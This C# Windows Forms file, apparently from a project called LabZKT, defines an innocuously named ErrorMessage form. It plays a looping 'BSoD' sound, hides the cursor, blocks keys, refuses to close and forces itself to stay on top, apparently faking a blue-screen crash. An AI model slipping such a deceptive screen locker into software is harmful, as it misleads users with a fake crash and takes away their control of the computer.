using System;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace LabZKT
{
    public partial class ErrorMessage : Form
    {
        public ErrorMessage()
        {
            InitializeComponent();
        }

        private void ErrorMessage_Load(object sender, EventArgs e)
        {
            FormBorderStyle = FormBorderStyle.None;
            BackgroundImageLayout = ImageLayout.Stretch;
            Cursor.Hide();
            SoundPlayer audio = new SoundPlayer(LabZKT.Properties.Resources.BSoD);
            audio.PlayLooping();
            getFocusCallBack = new DelegateGetFocus(getFocus);
            new Thread(keepFocus){
                IsBackground = true,
            }.Start();
        }

        private void ErrorMessage_KeyDown(object sender, KeyEventArgs e)
        {
            e.Handled = true;   
        }

        private void ErrorMessage_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        delegate void DelegateGetFocus();
        private DelegateGetFocus getFocusCallBack;
        private void keepFocus()
        {
            while (true)
              getFocus();
        }
        private void getFocus()
        {
            if (InvokeRequired)
            {
                try
                {
                    Invoke(getFocusCallBack);
                }
                catch (System.ObjectDisposedException)
                {
                    // Window was destroyed, terminate application.
                    Application.Exit();
                }
            }
            else
            {
                Focus();
                TopMost = true;
                Activate();
            }
        }

        private void ErrorMessage_Deactivate(object sender, EventArgs e)
        {
            //
        }

        private void ErrorMessage_Leave(object sender, EventArgs e)
        {
            //
        }
    }
}
